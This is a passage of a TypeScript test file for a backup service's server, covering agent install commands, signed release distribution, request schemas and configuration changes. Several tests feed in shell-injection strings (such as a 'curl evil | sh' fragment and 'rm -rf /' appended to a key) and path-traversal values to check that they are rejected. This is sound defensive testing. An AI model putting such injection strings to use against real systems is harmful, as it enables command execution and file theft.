import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { ResticError, defaultEndpointConfig } from "@restow/core";
import type { Endpoint, EndpointRun, EndpointTask } from "@restow/db";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { FailureTracker } from "./agent-auth.js";
import { agentFactsOf, configResponse, trimLogTail } from "./agent-service.js";
import { installCommands } from "./commands.js";

/** Stands in for a maintainer's SSHSIG signature (the server never checks it, the agent does). */
const SIGNATURE = "-----BEGIN SSH SIGNATURE-----\nU1NIU0lH\n-----END SSH SIGNATURE-----\n";
import {
  DISTRIBUTION_TARGETS,
  announcedAgentVersion,
  compareAgentVersions,
  distributionFile,
  isReleaseFile,
  isReleaseKey,
  isSafeOrigin,
  latestAgentRelease,
  listAgentVersions,
  parseChecksums,
  readChecksums,
  readReleaseFile,
  readReleaseKey,
  renderInstallScript,
} from "./distribution.js";
import {
  NO_RATED_TESTS,
  type RatedTests,
  attentionOf,
  effectiveSettings,
  hookFingerprint,
  hooksOf,
  problemsOf,
  storageOf,
  toRunDetail,
  toRunSummary,
  toTask,
} from "./dto.js";
import { isInsecureTransport } from "./instance-url.js";
import { ENDPOINT_PROBLEMS } from "./problems.js";
import { ResticGate } from "./restic-gate.js";
import {
  MAX_DOWNLOAD_PATHS,
  browseQuerySchema,
  createDownloadSchema,
  createTaskSchema,
  createTokenSchema,
  downloadParamSchema,
  enrollSchema,
  finishRunSchema,
  heartbeatSchema,
  listTokensQuerySchema,
  updateEndpointSchema,
} from "./schemas.js";
import {
  applyConfigChange,
  assertHooksAllowed,
  hookChangeNeedsRecentSignIn,
  resticProblem,
} from "./service.js";

describe("install commands", () => {
  it("carries no token: the script asks for it, or reads it from a root-only file", () => {
    const commands = installCommands("linux", "https://backup.example.org/");
    expect(commands.install).toBe(
      "curl -fsSL 'https://backup.example.org/install/linux.sh' | sudo sh",
    );
    expect(commands.installUnattended).toBe(
      "curl -fsSL 'https://backup.example.org/install/linux.sh' | sudo RESTOW_TOKEN_FILE=/root/restow-enrollment.token sh",
    );
    expect(commands.tokenFile).toBe("/root/restow-enrollment.token");
    for (const command of Object.values(commands)) {
      expect(command).not.toContain("rset_");
      expect(command).not.toContain("RESTOW_TOKEN=");
    }
    expect(commands.uninstallScript).toBe(
      "curl -fsSL 'https://backup.example.org/install/linux.sh' | sudo sh -s -- --uninstall",
    );
    expect(commands.uninstallAgent).toBe("sudo '/opt/restow-agent/bin/restow-agent' uninstall");
    expect(commands.hooksScripts).toBe("sudo '/opt/restow-agent/bin/restow-agent' hooks scripts");
    expect(commands.hooksAny).toBe("sudo '/opt/restow-agent/bin/restow-agent' hooks any");
  });

  it("uses the macOS script and the root-owned macOS location for macOS", () => {
    const commands = installCommands("darwin", "https://x.example");
    expect(commands.install).toBe("curl -fsSL 'https://x.example/install/macos.sh' | sudo sh");
    expect(commands.installUnattended).toBe(
      "curl -fsSL 'https://x.example/install/macos.sh' | sudo RESTOW_TOKEN_FILE=/var/root/restow-enrollment.token sh",
    );
    expect(commands.tokenFile).toBe("/var/root/restow-enrollment.token");
    expect(commands.uninstallAgent).toBe(
      "sudo '/Library/Application Support/Restow/bin/restow-agent' uninstall",
    );
  });

  it("refuses an instance address that is not a plain origin", () => {
    for (const url of [
      "https://x.example/$(id)",
      "https://x.example;id",
      "",
      "https://x example",
    ]) {
      expect(() => installCommands("linux", url), url).toThrow();
    }
    expect(installCommands("linux", "http://10.0.0.5:8080").install).toContain(
      "'http://10.0.0.5:8080/install/linux.sh'",
    );
  });

  it("recognises plain http to a foreign host as insecure", () => {
    expect(isInsecureTransport("https://restow.example.org")).toBe(false);
    expect(isInsecureTransport("http://localhost:8080")).toBe(false);
    expect(isInsecureTransport("http://127.0.0.1:3000")).toBe(false);
    expect(isInsecureTransport("http://192.168.1.10:8080")).toBe(true);
    expect(isInsecureTransport("not a url")).toBe(true);
  });
});

describe("distribution of the agent and its install scripts", () => {
  let root: string;

  beforeAll(async () => {
    root = await mkdtemp(join(tmpdir(), "restow-agent-dist-"));
    for (const version of ["0.1.0", "0.2.0", "0.10.0", "0.2.0-rc.1", "0.11.0"]) {
      await mkdir(join(root, version, "linux-amd64"), { recursive: true });
      await writeFile(join(root, version, "linux-amd64", "restow-agent"), `agent ${version}`);
      await writeFile(join(root, version, "linux-amd64", "restic"), "restic");
      await writeFile(
        join(root, version, "linux-amd64", "SHA256SUMS"),
        `${"a".repeat(63)}${version.length % 10}  restow-agent\n${"b".repeat(64)}  restic\n`,
      );
      // 0.11.0 is not signed: it is never offered as an update.
      if (version !== "0.11.0") {
        await writeFile(join(root, version, "SHA256SUMS.sig"), SIGNATURE);
      }
    }
    await mkdir(join(root, "not-a-version"), { recursive: true });
    await mkdir(join(root, "0.3.0", "darwin-arm64"), { recursive: true });
    await writeFile(join(root, "0.3.0", "darwin-arm64", "restow-agent"), "mac");
    await writeFile(
      join(root, "0.3.0", "SHA256SUMS"),
      `${"c".repeat(64)}  linux-amd64/restow-agent\n${"d".repeat(64)}  darwin-arm64/restow-agent\n`,
    );
    await writeFile(join(root, "0.3.0", "SHA256SUMS.sig"), SIGNATURE);
  });

  afterAll(async () => {
    await rm(root, { recursive: true, force: true });
  });

  it("offers Linux and macOS targets only", () => {
    expect(DISTRIBUTION_TARGETS).toEqual([
      "linux-amd64",
      "linux-arm64",
      "darwin-amd64",
      "darwin-arm64",
    ]);
  });

  it("orders versions by semver, a pre-release before its release, and ignores other folders", async () => {
    expect(await listAgentVersions(root)).toEqual([
      "0.11.0",
      "0.10.0",
      "0.3.0",
      "0.2.0",
      "0.2.0-rc.1",
      "0.1.0",
    ]);
    expect(compareAgentVersions("0.10.0", "0.9.0")).toBeGreaterThan(0);
    expect(compareAgentVersions("0.2.0-rc.1", "0.2.0")).toBeLessThan(0);
    expect(compareAgentVersions("v1.0.0", "1.0.0")).toBe(0);
  });

  it("announces the newest shipped version, else the image's release, else the fallback", async () => {
    expect(await announcedAgentVersion(root, {})).toBe("0.11.0");
    expect(await announcedAgentVersion(join(root, "missing"), { RESTOW_VERSION: "v1.4.2" })).toBe(
      "1.4.2",
    );
    expect(await announcedAgentVersion(join(root, "missing"), {})).toBe("0.1.0");
  });

  it("reads checksums from the target folder and from a list that covers every target", async () => {
    const own = await readChecksums("0.10.0", "linux-amd64", root);
    expect(own.get("restic")).toBe("b".repeat(64));
    const list = await readChecksums("0.3.0", "darwin-arm64", root);
    expect(list.get("restow-agent")).toBe("d".repeat(64));
    const linux = await readChecksums("0.3.0", "linux-amd64", root);
    expect(linux.get("restow-agent")).toBe("c".repeat(64));
    expect(parseChecksums(`${"e".repeat(64)} *restow-agent`).get("restow-agent")).toBe(
      "e".repeat(64),
    );
  });

  it("offers the newest signed agent for a target, never an unsigned one", async () => {
    const mac = await latestAgentRelease("darwin", "arm64", root);
    expect(mac).toMatchObject({ version: "0.3.0", target: "darwin-arm64", file: "restow-agent" });
    const linux = await latestAgentRelease("linux", "amd64", root);
    expect(linux?.version).toBe("0.10.0");
    expect(await latestAgentRelease("windows", "amd64", root)).toBeNull();
    expect(await latestAgentRelease("linux", "riscv64", root)).toBeNull();
  });

  it("serves the signed checksums and the signature of a release byte for byte", async () => {
    expect((await readReleaseFile("0.3.0", "SHA256SUMS", root))?.toString()).toContain(
      "darwin-arm64/restow-agent",
    );
    expect((await readReleaseFile("0.3.0", "SHA256SUMS.sig", root))?.toString()).toBe(SIGNATURE);
    expect(await readReleaseFile("0.11.0", "SHA256SUMS.sig", root)).toBeNull();
    expect(await readReleaseFile("../0.3.0", "SHA256SUMS", root)).toBeNull();
    expect(isReleaseFile("SHA256SUMS")).toBe(true);
    expect(isReleaseFile("restow-agent")).toBe(false);
  });

  it("serves only known files of known targets and never climbs out", async () => {
    expect(await distributionFile("0.1.0", "linux-amd64", "restow-agent", root)).toMatchObject({
      size: "agent 0.1.0".length,
    });
    for (const [version, target, file] of [
      ["0.1.0", "windows-amd64", "restow-agent.exe"],
      ["0.1.0", "linux-amd64", "../linux-amd64/restow-agent"],
      ["../etc", "linux-amd64", "passwd"],
      ["0.1.0", "linux-amd64", "missing"],
      ["latest", "linux-amd64", "restow-agent"],
      ["0.1.0", "../..", "x"],
    ] as const) {
      expect(
        await distributionFile(version, target, file, root),
        `${version}/${target}/${file}`,
      ).toBeNull();
    }
  });

  describe("the unversioned layout of a development build (agent/dist)", () => {
    let flat: string;

    beforeAll(async () => {
      flat = await mkdtemp(join(tmpdir(), "restow-agent-flat-"));
      await writeFile(join(flat, "VERSION"), "0.1.0\n");
      await mkdir(join(flat, "linux-arm64"), { recursive: true });
      await writeFile(join(flat, "linux-arm64", "restow-agent"), "agent");
      await writeFile(join(flat, "linux-arm64", "restic"), "restic");
      await writeFile(
        join(flat, "linux-arm64", "SHA256SUMS"),
        `${"1".repeat(64)}  restow-agent\n${"2".repeat(64)}  restic\n`,
      );
      await writeFile(
        join(flat, "SHA256SUMS"),
        `${"1".repeat(64)}  linux-arm64/restow-agent\n${"3".repeat(64)}  linux-amd64/restow-agent\n`,
      );
      await writeFile(join(flat, "SHA256SUMS.sig"), SIGNATURE);
    });

    afterAll(async () => {
      await rm(flat, { recursive: true, force: true });
    });

    it("announces the version of the VERSION file and serves the targets under it", async () => {
      expect(await listAgentVersions(flat)).toEqual(["0.1.0"]);
      expect(await announcedAgentVersion(flat, {})).toBe("0.1.0");
      expect(await distributionFile("0.1.0", "linux-arm64", "restow-agent", flat)).toMatchObject({
        size: 5,
      });
      expect(await distributionFile("0.2.0", "linux-arm64", "restow-agent", flat)).toBeNull();
      expect(await distributionFile("0.1.0", "linux-amd64", "restow-agent", flat)).toBeNull();
      const release = await latestAgentRelease("linux", "arm64", flat);
      expect(release).toMatchObject({ version: "0.1.0", sha256: "1".repeat(64) });
      expect((await readChecksums("0.1.0", "linux-arm64", flat)).get("restic")).toBe(
        "2".repeat(64),
      );
      expect((await readReleaseFile("0.1.0", "SHA256SUMS.sig", flat))?.toString()).toBe(SIGNATURE);
      expect(await readReleaseFile("0.2.0", "SHA256SUMS.sig", flat)).toBeNull();
    });
  });

  describe("install scripts", () => {
    const template = 'URL="__RESTOW_URL__"\nVERSION="__RESTOW_VERSION__"\necho "__RESTOW_URL__"';
    const key =
      "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMRVvWWyNWQd+TdyI0JkmmUUvnSIwVWcpYspaF0SOyZA restow-agent-release";

    it("fills the release key the script verifies with; the placeholder leaves it empty", async () => {
      expect(
        renderInstallScript("KEY='__RESTOW_RELEASE_KEY__'", "https://x.example", "0.1.1", key),
      ).toBe(`KEY='${key}'`);
      expect(
        renderInstallScript("KEY='__RESTOW_RELEASE_KEY__'", "https://x.example", "0.1.1"),
      ).toBe("KEY=''");
      for (const bad of [
        "ssh-ed25519 AAAA' ; id ; '",
        "ssh-rsa AAAAB3NzaC1yc2E",
        `${key}\nrm -rf /`,
      ]) {
        expect(isReleaseKey(bad), bad).toBe(false);
        expect(() => renderInstallScript(template, "https://x.example", "0.1.1", bad)).toThrow();
      }
      const folder = await mkdtemp(join(tmpdir(), "restow-agent-key-"));
      await mkdir(join(folder, "install"));
      await writeFile(join(folder, "release-signing.pub"), "# PLACEHOLDER\n# no key yet\n");
      expect(await readReleaseKey({ RESTOW_AGENT_INSTALL_DIR: join(folder, "install") })).toBe("");
      await writeFile(join(folder, "release-signing.pub"), `# comment\n${key}\n`);
      expect(await readReleaseKey({ RESTOW_AGENT_INSTALL_DIR: join(folder, "install") })).toBe(key);
      await rm(folder, { recursive: true, force: true });
    });

    it("fills both placeholders everywhere", () => {
      expect(renderInstallScript(template, "https://restow.example.org", "0.1.0")).toBe(
        'URL="https://restow.example.org"\nVERSION="0.1.0"\necho "https://restow.example.org"',
      );
      expect(renderInstallScript(template, "http://10.0.0.5:8080", "0.2.0-rc.1")).toContain(
        "10.0.0.5:8080",
      );
    });

    it("refuses an origin or version that could inject shell code", () => {
      for (const origin of [
        'https://x.example"; curl evil | sh; "',
        "https://x.example/path",
        "javascript:alert(1)",
        "https://x.example\nrm -rf /",
        "",
      ]) {
        expect(isSafeOrigin(origin), origin).toBe(false);
        expect(() => renderInstallScript(template, origin, "0.1.0")).toThrow();
      }
      expect(() => renderInstallScript(template, "https://x.example", '0.1.0"; id; "')).toThrow();
    });
  });
});

describe("failed logins", () => {
  it("blocks a key after the limit until the window ends", () => {
    const tracker = new FailureTracker(3, 1000);
    expect(tracker.isBlocked("ip", 0)).toBe(false);
    for (let i = 0; i < 3; i++) tracker.record("ip", i);
    expect(tracker.isBlocked("ip", 10)).toBe(true);
    expect(tracker.isBlocked("other", 10)).toBe(false);
    expect(tracker.retryAfterMs("ip", 10)).toBeGreaterThan(0);
    expect(tracker.isBlocked("ip", 1001)).toBe(false);
  });
});

describe("the restic gate", () => {
  it("limits concurrent restic processes overall and per tenant", () => {
    const gate = new ResticGate(3, 2);
    const a1 = gate.acquire("a");
    const a2 = gate.acquire("a");
    expect(() => gate.acquire("a")).toThrow(/too many snapshot reads/i);
    const b1 = gate.acquire("b");
    expect(() => gate.acquire("c")).toThrow();
    a1();
    a1(); // releasing twice frees only one slot
    expect(() => gate.acquire("c")).not.toThrow();
    a2();
    b1();
  });

  it("gives the slot back when the work fails", async () => {
    const gate = new ResticGate(1, 1);
    await expect(gate.run("t", async () => Promise.reject(new Error("x")))).rejects.toThrow("x");
    await expect(gate.run("t", async () => "ok")).resolves.toBe("ok");
  });
});

describe("log tails", () => {
  it("keeps short logs whole and the end of long ones", () => {
    expect(trimLogTail("a\nb")).toBe("a\nb");
    const long = `${"old line\n".repeat(5000)}the last line`;
    const trimmed = trimLogTail(long, 1024);
    expect(Buffer.byteLength(trimmed)).toBeLessThanOrEqual(1024);
    expect(trimmed.endsWith("the last line")).toBe(true);
    expect(trimmed.startsWith("old line")).toBe(true);
  });
});

describe("the configuration an agent is served", () => {
  const stored = {
    ...defaultEndpointConfig("linux", "server", { timeZone: "Europe/Berlin" }),
    bandwidthKbps: 500,
    bandwidthWindows: [
      { days: [1, 2, 3, 4, 5], from: "08:00", to: "18:00", kbps: 2000 },
      { days: [1, 2, 3, 4, 5], from: "22:00", to: "06:00", kbps: 0 },
    ],
  };
  // Tuesday 2026-10-06; Berlin is on CEST (UTC+2).
  const at = (iso: string) => ({ zone: "Europe/Berlin", now: new Date(iso) });

  it("carries the limit of the window that is active, else the default, and never the windows", () => {
    const day = configResponse(stored, 7, at("2026-10-06T08:00:00Z"));
    expect(day.bandwidthKbps).toBe(2000);
    expect(day.configVersion).toBe(7);
    expect("bandwidthWindows" in day).toBe(false);
    expect(configResponse(stored, 7, at("2026-10-06T17:00:00Z")).bandwidthKbps).toBe(500);
    // A window of 0 is unlimited, which the agent reads as null.
    expect(configResponse(stored, 7, at("2026-10-06T21:00:00Z")).bandwidthKbps).toBeNull();
  });

  it("is the stored configuration, byte for byte, when there are no windows", () => {
    const { bandwidthWindows: _windows, ...plain } = stored;
    const answer = configResponse(plain, 3, at("2026-10-06T08:00:00Z"));
    expect(answer).toEqual({ ...plain, configVersion: 3 });
    expect(
      configResponse({ ...plain, bandwidthWindows: [] }, 3, at("2026-10-06T08:00:00Z")),
    ).toEqual({
      ...plain,
      configVersion: 3,
    });
    // Without a moment to judge by (enrollment), the windows are only left out.
    expect(configResponse(stored, 1).bandwidthKbps).toBe(500);
  });

  it("reads the windows on the wall clock of the zone it is given", () => {
    const instant = new Date("2026-10-06T16:30:00Z");
    expect(configResponse(stored, 1, { zone: "Europe/Berlin", now: instant }).bandwidthKbps).toBe(
      500,
    ); // 18:30
    expect(
      configResponse(stored, 1, { zone: "America/New_York", now: instant }).bandwidthKbps,
    ).toBe(2000); // 12:30
  });
});

describe("configuration changes", () => {
  const current = defaultEndpointConfig("linux", "server", { timeZone: "Europe/Berlin" });

  it("changes only what differs and names it", () => {
    const { config, changed } = applyConfigChange(current, {
      paths: ["/srv"],
      onlyOnAcPower: false,
      bandwidthKbps: 2048,
      schedule: current.schedule,
    });
    expect(changed).toEqual(["paths", "bandwidthKbps"]);
    expect(config.paths).toEqual(["/srv"]);
    expect(config.bandwidthKbps).toBe(2048);
    expect(config.excludes).toEqual(current.excludes);
    expect(current.paths).not.toEqual(["/srv"]);
  });

  it("sets, changes and removes bandwidth windows, storing them in their normal order", () => {
    const night = { days: [5, 1], from: "22:00", to: "06:00", kbps: 0 };
    const set = applyConfigChange(current, { bandwidthWindows: [night] });
    expect(set.changed).toEqual(["bandwidthWindows"]);
    expect(set.config.bandwidthWindows).toEqual([{ ...night, days: [1, 5] }]);
    // The same windows again, written another way: nothing to change.
    expect(
      applyConfigChange(set.config, { bandwidthWindows: [{ ...night, days: [1, 5] }] }).changed,
    ).toEqual([]);
    // null and [] both remove them, and the key is gone, not empty.
    for (const removal of [null, []]) {
      const removed = applyConfigChange(set.config, { bandwidthWindows: removal });
      expect(removed.changed).toEqual(["bandwidthWindows"]);
      expect("bandwidthWindows" in removed.config).toBe(false);
    }
    expect(applyConfigChange(current, { bandwidthWindows: null }).changed).toEqual([]);
    expect(applyConfigChange(current, { bandwidthWindows: [] }).changed).toEqual([]);
    // Another change in the same request still lands on the final configuration.
    const both = applyConfigChange(set.config, { bandwidthWindows: null, onlyOnAcPower: true });
    expect(both.config.onlyOnAcPower).toBe(true);
    expect("bandwidthWindows" in both.config).toBe(false);
  });

  it("sets and clears hooks; empty text removes a hook", () => {
    const withHook = applyConfigChange(current, { hooks: { pre: "pg_dump x", post: "" } });
    expect(withHook.config.hooks).toEqual({ pre: "pg_dump x" });
    expect(withHook.changed).toEqual(["hooks"]);
    const cleared = applyConfigChange(withHook.config, { hooks: {} });
    expect(cleared.config.hooks).toEqual({});
    expect(applyConfigChange(withHook.config, { hooks: { pre: "pg_dump x" } }).changed).toEqual([]);
  });

  it("changes nothing when nothing differs", () => {
    expect(
      applyConfigChange(current, { paths: current.paths, excludes: current.excludes }).changed,
    ).toEqual([]);
  });

  it("asks for a recent sign-in for every hook change that leaves a hook to run", () => {
    expect(hookChangeNeedsRecentSignIn({ pre: "pg_dump x" })).toBe(true);
    expect(hookChangeNeedsRecentSignIn({ post: "db-dump" })).toBe(true);
    expect(hookChangeNeedsRecentSignIn({ pre: "a", post: "b" })).toBe(true);
    // Removing every hook makes the machine run less, never more.
    expect(hookChangeNeedsRecentSignIn({})).toBe(false);
    expect(hookChangeNeedsRecentSignIn({ pre: "", post: "" })).toBe(false);
  });
});

describe("request schemas", () => {
  it("validates enrollment", () => {
    const valid = {
      token: "rset_x",
      hostname: "web-01",
      os: "linux",
      arch: "arm64",
      agentVersion: "0.1.0",
      osVersion: "Ubuntu 24.04",
    };
    expect(enrollSchema.parse(valid).arch).toBe("arm64");
    expect(enrollSchema.safeParse({ ...valid, arch: "mips" }).success).toBe(false);
    expect(enrollSchema.safeParse({ ...valid, hostname: "" }).success).toBe(false);
    expect(enrollSchema.parse({ ...valid, osVersion: undefined }).osVersion).toBe("");
    // The machine's hook policy: absent from an earlier pre-release agent, anything unknown reads as off.
    expect(enrollSchema.parse(valid).hooks).toBeUndefined();
    expect(enrollSchema.parse({ ...valid, hooks: "scripts" }).hooks).toBe("scripts");
    expect(enrollSchema.parse({ ...valid, hooks: "everything" }).hooks).toBe("off");
  });

  it("reads the hook policy and the script names a heartbeat reports", () => {
    const beat = { agentVersion: "0.1.1", osVersion: "", state: "idle", nextRunAt: null };
    expect(heartbeatSchema.parse(beat).hooks).toBeUndefined();
    const parsed = heartbeatSchema.parse({
      ...beat,
      hooks: "scripts",
      hookScripts: ["db-dump", "../evil", "a b", "x".repeat(70), "fsfreeze.sh"],
    });
    expect(parsed.hooks).toBe("scripts");
    expect(parsed.hookScripts).toEqual(["db-dump", "fsfreeze.sh"]);
    expect(agentFactsOf(parsed, new Date("2026-10-01T10:00:00Z"))).toEqual({
      hooks: "scripts",
      hookScripts: ["db-dump", "fsfreeze.sh"],
      reportedAt: "2026-10-01T10:00:00.000Z",
    });
    expect(agentFactsOf(heartbeatSchema.parse(beat), new Date())).toBeNull();
    expect(
      agentFactsOf(heartbeatSchema.parse({ ...beat, hooks: "any" }), new Date()),
    ).not.toHaveProperty("hookScripts");
  });

  it("reads what the Go agent sends: numeric or empty config versions, samples without size", () => {
    const beat = { agentVersion: "0.1.0", osVersion: "", state: "idle", nextRunAt: null };
    expect(heartbeatSchema.parse({ ...beat, configVersion: 3 }).configVersion).toBe(3);
    expect(heartbeatSchema.parse({ ...beat, configVersion: "4" }).configVersion).toBe(4);
    expect(heartbeatSchema.parse({ ...beat, configVersion: "" }).configVersion).toBeNull();
    expect(heartbeatSchema.parse({ ...beat, configVersion: null }).configVersion).toBeNull();
    expect(heartbeatSchema.parse(beat).configVersion).toBeNull();
    expect(heartbeatSchema.safeParse({ ...beat, configVersion: "abc" }).success).toBe(false);
    const finished = finishRunSchema.parse({
      status: "succeeded",
      finishedAt: "2026-09-30T16:12:54.149634+02:00",
      sample: [{ path: "/empty", sha256: "a".repeat(64) }],
    });
    expect(finished.sample?.[0]?.size).toBe(0);
  });

  it("accepts the half megabyte a finished run may carry", () => {
    const base = { status: "failed", finishedAt: "2026-09-30T10:00:00Z" };
    const log = `${"x".repeat(2000)}\n`.repeat(200);
    expect(log.length).toBeGreaterThan(400_000);
    expect(finishRunSchema.safeParse({ ...base, logTail: log }).success).toBe(true);
    expect(finishRunSchema.safeParse({ ...base, logTail: "x".repeat(800 * 1024) }).success).toBe(
      false,
    );
  });

  it("limits samples, errors and the log a run can report", () => {
    const base = { status: "succeeded", finishedAt: "2026-09-30T10:00:00Z" };
    const sample = { path: "/a", sha256: "a".repeat(64), size: 1 };
    expect(finishRunSchema.safeParse({ ...base, sample: Array(20).fill(sample) }).success).toBe(
      true,
    );
    expect(finishRunSchema.safeParse({ ...base, sample: Array(21).fill(sample) }).success).toBe(
      false,
    );
    expect(
      finishRunSchema.safeParse({ ...base, sample: [{ ...sample, sha256: "xyz" }] }).success,
    ).toBe(false);
    expect(finishRunSchema.safeParse({ ...base, snapshotId: "not hex!" }).success).toBe(false);
    expect(finishRunSchema.safeParse({ ...base, finishedAt: "yesterday" }).success).toBe(false);
    expect(finishRunSchema.parse(base).errors).toEqual([]);
  });

  it("keeps a sample path exactly as restic names the file", () => {
    // Trimmed, "report.txt " would not be in the snapshot and the restore test would turn red.
    const finished = finishRunSchema.parse({
      status: "succeeded",
      finishedAt: "2026-09-30T10:00:00Z",
      sample: [{ path: "/home/ada/report.txt ", sha256: "a".repeat(64), size: 1 }],
    });
    expect(finished.sample?.[0]?.path).toBe("/home/ada/report.txt ");
  });

  it("reads the agent's restore-test result, and drops one that does not fit instead of refusing the run", () => {
    const base = { status: "failed", finishedAt: "2026-09-30T10:00:00Z" };
    const parsed = finishRunSchema.parse({
      ...base,
      restoreTest: {
        files: [
          { path: "/etc/hosts", sha256: "A".repeat(64) },
          { path: "/etc/gone", missing: true },
          { path: "/etc/odd", error: "The restored item is not a regular file." },
        ],
        restic: {
          exitCode: 1,
          fatal: "Fatal: There were 1 errors",
          errors: [{ item: "/etc/gone", message: "<data/0a1b> does not exist" }],
        },
        futureField: true,
      },
    });
    expect(parsed.restoreTest?.files[0]?.sha256).toBe("a".repeat(64));
    expect(parsed.restoreTest?.restic?.errors).toHaveLength(1);
    // An older agent sends none.
    expect(finishRunSchema.parse(base).restoreTest).toBeUndefined();
    for (const restoreTest of [
      { files: "nonsense" },
      { files: [{ path: "/a", sha256: "xyz" }] },
      { files: [], restic: { fatal: "Fatal: no exit code" } },
    ]) {
      const result = finishRunSchema.safeParse({ ...base, restoreTest });
      expect(result.success).toBe(true);
      expect(result.success && result.data.restoreTest).toBeUndefined();
    }
  });

  it("validates a configuration change", () => {
    expect(updateEndpointSchema.safeParse({}).success).toBe(false);
    expect(updateEndpointSchema.safeParse({ config: { paths: [] } }).success).toBe(false);
    expect(updateEndpointSchema.safeParse({ config: { paths: ["relative/path"] } }).success).toBe(
      false,
    );
    expect(updateEndpointSchema.safeParse({ config: { paths: ["/srv", "/home"] } }).success).toBe(
      true,
    );
    expect(
      updateEndpointSchema.safeParse({
        config: { schedule: { kind: "daily", timeZone: "Europe/Berlin" } },
      }).success,
    ).toBe(false);
    expect(
      updateEndpointSchema.safeParse({
        config: { schedule: { kind: "daily", timeOfDay: "22:00", timeZone: "Europe/Berlin" } },
      }).success,
    ).toBe(true);
    expect(
      updateEndpointSchema.safeParse({
        config: { schedule: { kind: "daily", timeOfDay: "25:00", timeZone: "Europe/Berlin" } },
      }).success,
    ).toBe(false);
    expect(
      updateEndpointSchema.safeParse({
        config: { schedule: { kind: "interval", timeZone: "Nowhere/City", intervalMinutes: 60 } },
      }).success,
    ).toBe(false);
    expect(
      updateEndpointSchema.safeParse({
        settings: { retention: { keepDaily: -1, keepWeekly: 1, keepMonthly: 1 } },
      }).success,
    ).toBe(false);
  });

  it("creates tokens for a profile and system", () => {
    expect(createTokenSchema.safeParse({ profile: "server", os: "linux" }).success).toBe(true);
    expect(createTokenSchema.safeParse({ profile: "laptop", os: "linux" }).success).toBe(false);
  });

  it("validates tasks, browsing and downloads", () => {
    const snapshotId = "a".repeat(64);
    expect(createTaskSchema.safeParse({ kind: "backup_now" }).success).toBe(true);
    expect(createTaskSchema.safeParse({ kind: "uninstall" }).success).toBe(false);
    expect(
      createTaskSchema.safeParse({
        kind: "restore",
        snapshotId,
        paths: ["/etc"],
        targetDir: "/restore",
      }).success,
    ).toBe(true);
    expect(createTaskSchema.safeParse({ kind: "restore", snapshotId, paths: [] }).success).toBe(
      false,
    );
    expect(
      createTaskSchema.safeParse({ kind: "restore", snapshotId, paths: ["etc"] }).success,
    ).toBe(false);
    expect(
      createTaskSchema.safeParse({ kind: "restore", snapshotId: "--flag", paths: ["/etc"] })
        .success,
    ).toBe(false);
    expect(browseQuerySchema.parse({ snapshotId }).path).toBe("/");
    expect(browseQuerySchema.safeParse({ snapshotId: "latest" }).success).toBe(false);
    // A restore folder is a plain absolute path, never one that climbs out or is the root.
    for (const targetDir of [
      "/",
      "relative",
      "/srv/../etc",
      "/srv/./x",
      "/srv//x",
      "/srv/x/",
      "C:\\Restore",
    ]) {
      expect(
        createTaskSchema.safeParse({ kind: "restore", snapshotId, paths: ["/etc"], targetDir })
          .success,
        targetDir,
      ).toBe(false);
    }
    expect(
      createTaskSchema.safeParse({
        kind: "restore",
        snapshotId,
        paths: ["/etc"],
        targetDir: "/srv/restore-2026",
      }).success,
    ).toBe(true);
  });

  it("takes a snapshot id in either case and keeps only the lower-case form", () => {
    // The agent accepts lower case only; an upper-case id must never reach a task.
    const upper = "ABCDEF12".repeat(8);
    const lower = upper.toLowerCase();
    const task = createTaskSchema.parse({ kind: "restore", snapshotId: upper, paths: ["/etc"] });
    expect(task.kind === "restore" ? task.snapshotId : null).toBe(lower);
    expect(browseQuerySchema.parse({ snapshotId: "ABCDEF12" }).snapshotId).toBe("abcdef12");
    expect(createDownloadSchema.parse({ snapshotId: upper, paths: ["/etc"] }).snapshotId).toBe(
      lower,
    );
    expect(
      finishRunSchema.parse({
        status: "succeeded",
        finishedAt: new Date().toISOString(),
        snapshotId: upper,
      }).snapshotId,
    ).toBe(lower);
    expect(browseQuerySchema.safeParse({ snapshotId: "ABCDEFG1" }).success).toBe(false);
    expect(browseQuerySchema.safeParse({ snapshotId: "abc" }).success).toBe(false);
  });

  it("pages a folder by cursor and keeps a page within bounds", () => {
    const snapshotId = "a".repeat(64);
    expect(browseQuerySchema.parse({ snapshotId }).limit).toBe(1000);
    expect(browseQuerySchema.parse({ snapshotId }).cursor).toBeUndefined();
    expect(browseQuerySchema.parse({ snapshotId, cursor: "abc_-09" }).cursor).toBe("abc_-09");
    expect(browseQuerySchema.safeParse({ snapshotId, limit: "5000" }).success).toBe(true);
    expect(browseQuerySchema.safeParse({ snapshotId, limit: "5001" }).success).toBe(false);
    expect(browseQuerySchema.safeParse({ snapshotId, limit: "0" }).success).toBe(false);
    expect(browseQuerySchema.safeParse({ snapshotId, cursor: "" }).success).toBe(false);
  });

  it("takes the paths of a download in the body, up to ten thousand", () => {
    const snapshotId = "a".repeat(64);
    const paths = (count: number) => Array.from({ length: count }, (_, index) => `/data/f${index}`);
    expect(MAX_DOWNLOAD_PATHS).toBe(10_000);
    expect(createDownloadSchema.safeParse({ snapshotId, paths: paths(1) }).success).toBe(true);
    expect(createDownloadSchema.safeParse({ snapshotId, paths: paths(10_000) }).success).toBe(true);
    expect(createDownloadSchema.safeParse({ snapshotId, paths: paths(10_001) }).success).toBe(
      false,
    );
    expect(createDownloadSchema.safeParse({ snapshotId, paths: [] }).success).toBe(false);
    expect(createDownloadSchema.safeParse({ snapshotId, paths: ["relative/path"] }).success).toBe(
      false,
    );
    expect(createDownloadSchema.safeParse({ snapshotId: "latest", paths: ["/etc"] }).success).toBe(
      false,
    );
    // The old shape (paths in the query) is gone.
    expect(createDownloadSchema.safeParse({ snapshotId, path: "/etc" }).success).toBe(false);
  });

  it("names a prepared download by two ids", () => {
    const id = "11111111-1111-4111-8111-111111111111";
    expect(downloadParamSchema.safeParse({ id, downloadId: id }).success).toBe(true);
    expect(downloadParamSchema.safeParse({ id, downloadId: "x" }).success).toBe(false);
  });

  it("lists the valid tokens unless asked for every state", () => {
    expect(listTokensQuerySchema.parse({}).state).toBe("valid");
    expect(listTokensQuerySchema.parse({ state: "all" }).state).toBe("all");
    expect(listTokensQuerySchema.safeParse({ state: "used" }).success).toBe(false);
  });
});

describe("what needs attention", () => {
  const now = new Date("2026-09-30T12:00:00Z");
  const endpoint = (overrides: Partial<Endpoint>): Endpoint =>
    ({
      profile: "server",
      status: "active",
